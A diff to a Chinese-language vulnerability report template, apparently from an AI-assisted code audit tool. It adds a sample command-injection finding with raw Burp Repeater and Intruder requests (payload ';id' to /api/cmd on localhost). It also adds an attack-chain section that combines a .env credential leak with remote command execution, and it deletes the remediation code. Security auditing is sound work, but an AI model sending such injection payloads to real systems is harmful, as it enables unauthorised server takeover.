@@ -59,6 +59,7 @@
 | Sink 位置 | app/Service/CmdService.php:45 system() |
 | 鉴权要求 | anonymous |
 | 可信度 | ✅ 已确认 |
+| AI 验证 | ✅ 已通过 AI 自动验证 / ⚠️ AI 辅助分析（未实际执行） / ❌ 纯静态分析 |
 
 #### 攻击链
 ```
@@ -78,6 +79,8 @@ Source: $_POST['cmd']
 ```
 
 #### Burp 复现包
+
+原始 HTTP 请求（可直接导入 Burp Suite Repeater）:
 ```http
 POST /api/cmd HTTP/1.1
 Host: localhost:8080
@@ -85,6 +88,16 @@ Content-Type: application/x-www-form-urlencoded
 
 cmd=;id
 ```
+
+Burp Intruder 模板（标记注入点，可导入 Burp Suite Intruder）:
+```http
+POST /api/cmd HTTP/1.1
+Host: localhost:8080
+Content-Type: application/x-www-form-urlencoded
+
+cmd=§;id§
+```
+> 注入点用 `§` 标记，Attack type 建议: Sniper / Battering ram，Payload 参考 `shared/payload_templates.md` 对应漏洞类型章节。
 
 #### 物理证据
 ```
@@ -99,17 +112,20 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 |------|------|---------|------|----------|
 | R1 | 基础命令注入 | ;id | ✅ 成功 | - |
 
-#### 修复方案
-```php
-// 修复前（危险）
-system($command);
+#### 联合攻击利用链
 
-// 修复后（安全）
-$allowedCommands = ['ls', 'whoami'];
-if (in_array($command, $allowedCommands, true)) {
-    system(escapeshellcmd($command));
-}
+当该漏洞可与其他漏洞组合形成更高危害的攻击链时，列出完整链路:
+
 ```
+链路: V-003 (信息泄露) → V-001 (RCE) → 完全控制
+  Step 1: 利用 V-003 (.env 泄露) 获取数据库凭据
+  Step 2: 利用 V-001 (命令注入) 在服务器执行任意命令
+  Step 3: 结合两者实现从匿名用户到服务器完全控制
+  组合危害等级: P0 Critical（单独 V-003 为 P2，组合后升级）
+```
+
+> 若该漏洞无可组合链路，标注「无关联攻击链」。
+> 链路模式参考 `shared/attack_chains.md`，重点评估跨漏洞组合后的实际危害升级。
 
 ### 附录
 
